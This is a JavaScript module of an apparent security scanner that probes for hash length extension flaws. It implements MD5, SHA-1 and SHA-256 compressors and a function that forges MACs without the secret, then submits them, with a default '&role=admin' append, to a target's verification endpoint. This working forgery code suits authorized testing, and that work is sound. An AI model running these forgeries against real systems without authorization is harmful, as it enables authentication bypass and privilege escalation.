// Dark Matter rule-based scanner — hash length extension attack probe.
// (Coverage row #506 [High] hash length extension, CWE-327 / CWE-347;
// phase 'hash-length-extension'.)
//
// A MAC built as H(secret ‖ message) over a Merkle-Damgård hash
// (MD5, SHA-1, SHA-2) is forgeable without the secret: the digest
// IS the hash's internal state after the message, so an attacker can
// append glue padding + new data and continue hashing from the
// published digest. The forged MAC verifies under the unknown secret
// as long as the secret length is guessed (tried here over a small
// range). HMAC and SHA-3 are NOT vulnerable — SHA-3 is a sponge,
// HMAC double-hashes with a keyed outer pass — and the probe
// refuses those algorithms outright instead of crying wolf.
//
// IMPLEMENTATION: the MD5 / SHA-1 / SHA-256 compression functions
// are implemented in pure code below with injectable state (the
// published digest becomes the starting state). Node's crypto Hash
// cannot be seeded with arbitrary state, so there is no shortcut —
// and no hash_extender dependency. Each compressor is verified
// against node:crypto test vectors in the unit tests.
//
// ORACLE: the forged MAC must be ACCEPTED by the target's own
// verification endpoint (opts.verifyMac, or a POST to
// opts.verifyUrl / url carrying { message, mac, algorithm }).
// Two controls gate the verdict: a RANDOM mac of the same length
// submitted for the forged message must be REJECTED (otherwise the
// endpoint is not checking MACs at all), and the forged MAC
// submitted for the ORIGINAL message must be REJECTED (otherwise
// the endpoint accepts any MAC). The forged MAC must also be
// accepted twice (repeat). Only then is the finding filed —
// differential: forged accepted vs random rejected, reproducibly.
// The probe needs the original (message, mac, algorithm) triple,
// supplied via opts.hashLengthExtension; without it the phase
// skips gracefully (no MAC surface to test), never a finding.
//
// SAFETY: read-only verification attempts against the target's own
// endpoint; the forged message only appends benign data
// (default "&role=admin" is NOT submitted to a privileged action —
// it is a verification check, and the probe never follows it with
// a state-changing request). No secret is ever needed, requested,
// or logged; the secret length is found by trial, never recovered.
//
// HONEST LIMITS: no dedicated hash-extension lab exists today —
// verified against local mock servers only (a secret‖message MAC
// verifier, an HMAC verifier, and an accept-everything verifier).
// A live target proof is a later lane. SHA-512 / SHA-384 are
// Merkle-Damgård and vulnerable in principle, but their
// compressors are not implemented here — the probe skips them with
// a diagnostic instead of guessing. The secret-length sweep is
// 1..32 by default; a longer secret is missed, not misreported.

import { randomBytes } from 'node:crypto';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const TIMEOUT_MS = 15000;
const DEFAULT_APPEND = '&role=admin';
const DEFAULT_SECRET_LENGTHS = Array.from({ length: 32 }, (_, i) => i + 1);

function rotl32(x, c) {
  return ((x << c) | (x >>> (32 - c))) >>> 0;
}
function rotr32(x, c) {
  return ((x >>> c) | (x << (32 - c))) >>> 0;
}
function add32(...xs) {
  let s = 0;
  for (const x of xs) s = (s + (x >>> 0)) >>> 0;
  return s >>> 0;
}

// ---- MD5 compression (RFC 1321), state-injectable ----------------------------

const MD5_SHIFTS = [
  7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
];
const MD5_K = Array.from({ length: 64 }, (_, i) =>
  Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296) >>> 0);

function md5Compress(state, block) {
  const m = [];
  for (let i = 0; i < 16; i += 1) m.push(block.readUInt32LE(i * 4));
  let [a, b, c, d] = state;
  for (let i = 0; i < 64; i += 1) {
    let f;
    let g;
    if (i < 16) {
      f = (b & c) | (~b & d);
      g = i;
    } else if (i < 32) {
      f = (d & b) | (c & ~d);
      g = (5 * i + 1) % 16;
    } else if (i < 48) {
      f = b ^ c ^ d;
      g = (3 * i + 5) % 16;
    } else {
      f = c ^ (b | ~d);
      g = (7 * i) % 16;
    }
    const tmp = d;
    d = c;
    c = b;
    b = add32(b, rotl32(add32(a, f, MD5_K[i], m[g]), MD5_SHIFTS[i]));
    a = tmp;
  }
  return [add32(state[0], a), add32(state[1], b), add32(state[2], c), add32(state[3], d)];
}

// ---- SHA-1 compression (FIPS 180-1), state-injectable ------------------------

function sha1Compress(state, block) {
  const w = [];
  for (let i = 0; i < 16; i += 1) w.push(block.readUInt32BE(i * 4));
  for (let i = 16; i < 80; i += 1) w.push(rotl32(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1));
  let [a, b, c, d, e] = state;
  for (let i = 0; i < 80; i += 1) {
    let f;
    let k;
    if (i < 20) {
      f = (b & c) | (~b & d);
      k = 0x5a827999;
    } else if (i < 40) {
      f = b ^ c ^ d;
      k = 0x6ed9eba1;
    } else if (i < 60) {
      f = (b & c) | (b & d) | (c & d);
      k = 0x8f1bbcdc;
    } else {
      f = b ^ c ^ d;
      k = 0xca62c1d6;
    }
    const tmp = add32(rotl32(a, 5), f, e, k, w[i]);
    e = d;
    d = c;
    c = rotl32(b, 30);
    b = a;
    a = tmp;
  }
  return [add32(state[0], a), add32(state[1], b), add32(state[2], c), add32(state[3], d), add32(state[4], e)];
}

// ---- SHA-256 compression (FIPS 180-4), state-injectable ----------------------

const SHA256_K = [
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

function sha256Compress(state, block) {
  const w = [];
  for (let i = 0; i < 16; i += 1) w.push(block.readUInt32BE(i * 4));
  for (let i = 16; i < 64; i += 1) {
    const s0 = rotr32(w[i - 15], 7) ^ rotr32(w[i - 15], 18) ^ (w[i - 15] >>> 3);
    const s1 = rotr32(w[i - 2], 17) ^ rotr32(w[i - 2], 19) ^ (w[i - 2] >>> 10);
    w.push(add32(w[i - 16], s0, w[i - 7], s1));
  }
  let [a, b, c, d, e, f, g, h] = state;
  for (let i = 0; i < 64; i += 1) {
    const S1 = rotr32(e, 6) ^ rotr32(e, 11) ^ rotr32(e, 25);
    const ch = (e & f) ^ (~e & g);
    const t1 = add32(h, S1, ch, SHA256_K[i], w[i]);
    const S0 = rotr32(a, 2) ^ rotr32(a, 13) ^ rotr32(a, 22);
    const maj = (a & b) ^ (a & c) ^ (b & c);
    const t2 = add32(S0, maj);
    h = g;
    g = f;
    f = e;
    e = add32(d, t1);
    d = c;
    c = b;
    b = a;
    a = add32(t1, t2);
  }
  return [
    add32(state[0], a), add32(state[1], b), add32(state[2], c), add32(state[3], d),
    add32(state[4], e), add32(state[5], f), add32(state[6], g), add32(state[7], h),
  ];
}

// ---- algorithm table ----------------------------------------------------------

const ALGORITHMS = {
  md5: {
    initial: [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476],
    compress: md5Compress,
    digestLength: 32,
    wordToBytes: (w) => {
      const b = Buffer.alloc(4);
      b.writeUInt32LE(w >>> 0, 0);
      return b;
    },
    bytesToWord: (buf, off) => buf.readUInt32LE(off),
  },
  sha1: {
    initial: [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0],
    compress: sha1Compress,
    digestLength: 40,
    wordToBytes: (w) => {
      const b = Buffer.alloc(4);
      b.writeUInt32BE(w >>> 0, 0);
      return b;
    },
    bytesToWord: (buf, off) => buf.readUInt32BE(off),
  },
  sha256: {
    initial: [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19],
    compress: sha256Compress,
    digestLength: 64,
    wordToBytes: (w) => {
      const b = Buffer.alloc(4);
      b.writeUInt32BE(w >>> 0, 0);
      return b;
    },
    bytesToWord: (buf, off) => buf.readUInt32BE(off),
  },
};

export const SUPPORTED_ALGORITHMS = Object.keys(ALGORITHMS);

/** Normalize an algorithm name ('SHA-1', 'sha256', …) or null. Pure. */
export function normalizeAlgorithm(name) {
  if (!name) return null;
  const n = String(name).toLowerCase().replace(/[-_]/g, '');
  if (n === 'md5') return 'md5';
  if (n === 'sha1') return 'sha1';
  if (n === 'sha256') return 'sha256';
  return n;
}

/** True for constructions the length-extension attack cannot touch
 *  (HMAC, SHA-3 / SHAKE, BLAKE). Pure. */
export function isImmuneAlgorithm(name) {
  const n = String(name || '').toLowerCase();
  return /hmac|sha[-_]?3|shake|blake/.test(n);
}

/** True when the algorithm is implemented here (MD5 / SHA-1 / SHA-256). Pure. */
export function isSupportedAlgorithm(name) {
  return normalizeAlgorithm(name) in ALGORITHMS;
}

// ---- pure helpers (exported for unit tests) ---------------------------------

/**
 * Merkle-Damgård glue padding for a message of `totalLength` bytes
 * (secret ‖ message): 0x80, zero bytes until length ≡ 56 (mod 64),
 * then the 8-byte bit length — little-endian for MD5, big-endian
 * for SHA-1 / SHA-256. Pure.
 */
export function gluePadding(totalLength, algorithm = 'sha256') {
  const rem = totalLength % 64;
  const zeroCount = rem < 56 ? 56 - rem - 1 : 56 + 64 - rem - 1;
  const pad = Buffer.alloc(1 + zeroCount + 8);
  pad[0] = 0x80;
  if (normalizeAlgorithm(algorithm) === 'md5') pad.writeBigUInt64LE(BigInt(totalLength) * 8n, 1 + zeroCount);
  else pad.writeBigUInt64BE(BigInt(totalLength) * 8n, 1 + zeroCount);
  return pad;
}

/**
 * Continue a hash from an injected state over `data`, where
 * `totalLength` is the full length the hash has consumed including
 * any earlier part (secret ‖ message ‖ glue) — the length field in
 * the final padding must cover the whole message, not just `data`.
 * The caller must ensure `data` starts at a block boundary (for a
 * forgery that is exactly what the glue padding guarantees).
 * Returns the digest hex. Pure.
 */
export function continueHash(algorithm, stateWords, data, totalLength) {
  const algo = ALGORITHMS[normalizeAlgorithm(algorithm)];
  if (!algo) throw new Error(`unsupported algorithm: ${algorithm}`);
  const dataBuf = Buffer.isBuffer(data) ? data : Buffer.from(String(data), 'latin1');
  const rem = totalLength % 64;
  const zeroCount = rem < 56 ? 56 - rem - 1 : 56 + 64 - rem - 1;
  const pad = Buffer.alloc(1 + zeroCount + 8);
  pad[0] = 0x80;
  if (normalizeAlgorithm(algorithm) === 'md5') pad.writeBigUInt64LE(BigInt(totalLength) * 8n, 1 + zeroCount);
  else pad.writeBigUInt64BE(BigInt(totalLength) * 8n, 1 + zeroCount);
  const full = Buffer.concat([dataBuf, pad]);
  let state = [...stateWords];
  for (let off = 0; off < full.length; off += 64) {
    state = algo.compress(state, full.subarray(off, off + 64));
  }
  return Buffer.concat(state.map((w) => algo.wordToBytes(w))).toString('hex');
}

/**
 * Hash a message from the initial state with the pure compressors
 * (test-vector check for the implementation itself). Pure.
 */
export function computeHash(algorithm, message) {
  const algo = ALGORITHMS[normalizeAlgorithm(algorithm)];
  if (!algo) throw new Error(`unsupported algorithm: ${algorithm}`);
  const buf = Buffer.isBuffer(message) ? message : Buffer.from(String(message), 'latin1');
  return continueHash(algorithm, algo.initial, buf, buf.length);
}

/**
 * Forge H(secret ‖ message ‖ glue ‖ append) from the published
 * digest, WITHOUT the secret. `messageLength` is the original
 * message length in bytes; `secretLength` is the guessed secret
 * length. Returns { forgedMac, gluePadding, extension,
 * totalOriginal }; the caller concatenates the original message
 * bytes with `extension` to build the forged message. Pure.
 */
export function forgeMac({ algorithm, originalMac, messageLength, append, secretLength }) {
  const algo = ALGORITHMS[normalizeAlgorithm(algorithm)];
  if (!algo) throw new Error(`unsupported algorithm: ${algorithm}`);
  const macBuf = Buffer.from(String(originalMac), 'hex');
  if (macBuf.length * 2 !== algo.digestLength) {
    throw new Error(`digest length mismatch for ${algorithm}: expected ${algo.digestLength} hex chars`);
  }
  const state = [];
  for (let i = 0; i < macBuf.length; i += 4) state.push(algo.bytesToWord(macBuf, i));
  const totalOriginal = secretLength + messageLength;
  const glue = gluePadding(totalOriginal, algorithm);
  const appendBuf = Buffer.from(String(append), 'latin1');
  const extension = Buffer.concat([glue, appendBuf]);
  const totalForged = totalOriginal + extension.length;
  // The published digest is the state AFTER the original message's
  // own padding — and that padding IS the glue. So the digest
  // already embodies (secret ‖ message ‖ glue); the continuation
  // feeds only the append (+ its own final padding for the new
  // total length). Feeding the glue again would double-count it
  // and misalign the blocks.
  const forgedMac = continueHash(algorithm, state, appendBuf, totalForged);
  return {
    forgedMac,
    gluePadding: glue,
    extension,
    totalOriginal,
  };
}

// ---- the probe ---------------------------------------------------------------

function defaultVerifyMac(url, fetchFn, timeoutMs) {
  return async (message, mac, algorithm) => {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetchFn(url, {
        method: 'POST',
        signal: ctrl.signal,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/json' },
        body: JSON.stringify({ message, mac, algorithm }),
      });
      const text = await res.text().catch(() => '');
      try {
        const parsed = JSON.parse(text);
        if (typeof parsed.valid === 'boolean') return parsed.valid;
        if (typeof parsed.accepted === 'boolean') return parsed.accepted;
      } catch { /* fall through to the text check */ }
      return /accepted|mac valid/i.test(text) && !/invalid|rejected/i.test(text);
    } catch {
      return false;
    } finally {
      clearTimeout(t);
    }
  };
}

export async function probeHashLengthExtension(url, opts = {}) {
  const findings = [];
  const diag = opts && typeof opts.diagnostics === 'object' && opts.diagnostics ? opts.diagnostics : null;
  const setDiag = (k, v) => {
    if (diag) diag[k] = v;
  };
  const spec = opts.hashLengthExtension || null;
  if (!spec || !spec.message || !spec.mac || !spec.algorithm) {
    setDiag('skipped', 'no MAC triple supplied (opts.hashLengthExtension needs message, mac, algorithm)');
    return findings;
  }
  const algorithm = normalizeAlgorithm(spec.algorithm);
  setDiag('algorithm', algorithm);
  if (isImmuneAlgorithm(spec.algorithm)) {
    setDiag('skipped', `immune construction (${spec.algorithm}) — HMAC / SHA-3 cannot be length-extended`);
    return findings;
  }
  if (!isSupportedAlgorithm(spec.algorithm)) {
    setDiag('skipped', `unsupported algorithm (${spec.algorithm}) — only md5 / sha1 / sha256 implemented`);
    return findings;
  }
  const append = spec.append !== undefined ? String(spec.append) : DEFAULT_APPEND;
  const secretLengths = Array.isArray(spec.secretLengths) && spec.secretLengths.length
    ? spec.secretLengths
    : DEFAULT_SECRET_LENGTHS;
  const timeoutMs = opts.timeoutMs || TIMEOUT_MS;
  const fetchFn = typeof opts.fetchFn === 'function' ? opts.fetchFn : globalThis.fetch;
  const verifyUrl = opts.verifyUrl || url;
  const verifyMac =
    typeof opts.verifyMac === 'function' ? opts.verifyMac : defaultVerifyMac(verifyUrl, fetchFn, timeoutMs);
  const messageBuf = Buffer.from(String(spec.message), 'latin1');

  // The verifier must actually check MACs: a random MAC for the
  // forged message must be rejected, or the endpoint proves nothing.
  // (Checked per candidate message below, once a forgery is built.)
  let tried = 0;
  for (const secretLength of secretLengths) {
    tried += 1;
    setDiag('secretLengthsTried', tried);
    let forged;
    try {
      forged = forgeMac({
        algorithm,
        originalMac: spec.mac,
        messageLength: messageBuf.length,
        append,
        secretLength,
      });
    } catch {
      continue;
    }
    const forgedMessage = Buffer.concat([messageBuf, forged.extension]).toString('latin1');
    const accepted = await verifyMac(forgedMessage, forged.forgedMac, algorithm);
    if (!accepted) continue;

    // Repeat + controls: the forged MAC must verify twice, a random
    // MAC for the same forged message must fail, and the forged MAC
    // for the ORIGINAL message must fail.
    const acceptedRepeat = await verifyMac(forgedMessage, forged.forgedMac, algorithm);
    const digestBytes = ALGORITHMS[algorithm].digestLength / 2;
    const randomHex = randomBytes(digestBytes).toString('hex');
    const randomAccepted = await verifyMac(forgedMessage, randomHex, algorithm);
    const wrongMessageAccepted = await verifyMac(String(spec.message), forged.forgedMac, algorithm);
    setDiag('forgedAccepted', true);
    setDiag('secretLength', secretLength);
    setDiag('randomControlAccepted', randomAccepted);
    setDiag('wrongMessageAccepted', wrongMessageAccepted);
    if (!acceptedRepeat || randomAccepted || wrongMessageAccepted) continue;

    findings.push({
      class: 'hash_length_extension',
      id: `hash-length-extension-${algorithm}`,
      title: `Hash length extension attack — forged MAC accepted (${algorithm})`,
      severity: 'high',
      url,
      evidence: {
        request: `MAC verification for message "${String(spec.message).slice(0, 60)}" + glue padding + "${append}" with forged ${algorithm} MAC ${forged.forgedMac.slice(0, 16)}… (secret length ${secretLength}, secret itself never known)`,
        response: `forged MAC ACCEPTED twice by the verification endpoint; random MAC for the same message REJECTED; forged MAC for the original message REJECTED — the endpoint verifies H(secret ‖ message) over ${algorithm}, which the extension forges without the secret`,
        impact_demo: 'attacker extends a signed message with arbitrary appended data (e.g. privilege fields) and the forged MAC still verifies — authentication bypass on MAC-protected messages',
        signalCorrelated: true,
      },
    });
    return findings;
  }
  setDiag('forgedAccepted', false);
  return findings;
}

export const __hashLengthExtensionMeta = { phases: ['hash-length-extension'], depth: ['standard', 'deep'] };
